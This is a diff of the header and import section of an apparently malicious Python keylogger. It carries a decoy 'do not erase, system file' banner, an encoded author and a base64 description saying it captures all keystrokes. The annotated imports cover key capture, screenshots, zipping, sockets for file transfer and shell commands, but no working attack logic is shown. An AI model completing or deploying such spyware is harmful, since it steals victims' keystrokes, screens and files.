@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 '''
------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!
 
 Author : 00110101 00110001 00100000 00110101 00110111 00100000 00110111 00111000 
@@ -35,14 +35,22 @@ Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
 			                         '-`  |_|     '-`  |_|     '-`  |_|
 			                        /mmm/        /mmm/        /mmm/
 					                  !
+----------------------------------------------------------------------------------------------------
 '''
 
+# import module for capturing keystrokes
 from pynput import keyboard
+# import module to zip files
 from zipfile import ZipFile
+# import module to grab screenshots
 import pyautogui as pygrab
+# import module to run functions at specific times
 import threading
+# import socket to initialize socket for file transfer
 import socket as sck
+# import os and time for file path work and naming files
 import os, time
+# import subprocess to execute terminal commands
 import subprocess as subp
 
 
